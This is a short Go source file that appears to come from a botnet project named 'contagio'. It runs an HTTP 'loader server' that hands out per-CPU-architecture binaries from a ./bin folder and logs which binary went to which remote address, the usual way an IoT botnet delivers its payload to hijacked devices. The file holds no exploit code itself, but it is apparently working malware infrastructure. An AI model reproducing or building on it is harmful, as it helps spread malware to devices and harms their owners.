package loader_server

import (
	"contagio/contagio/config"
	"contagio/contagio/config/logging"
	"fmt"
	"net/http"
	"net/url"
)

func StartLoader(config *config.Config) {

	for _, i := range Archs {
		go http.HandleFunc("/"+i, serve)
	}

	logging.PrintInfo("Loader server ready: " + config.LoaderServer)

	err := http.ListenAndServe(config.LoaderServer, nil)

	if err != nil {
		logging.PrintInfo("Loader fatal error: " + err.Error())
		config.Wg.Done()
		return
	}
}
func serve(w http.ResponseWriter, r *http.Request) {

	for _, i := range Archs {

		if "/"+i == r.RequestURI {
			w.Header().Set("Content-Disposition", `attachment; filename*=UTF-8''`+url.QueryEscape(i))

			http.ServeFile(w, r, "./bin/"+i)

			if !config.Disable_Debug {
				logging.PrintInfo(fmt.Sprintf("[http] %s sent to %s\n", i, r.RemoteAddr))
			}

		}

	}
}
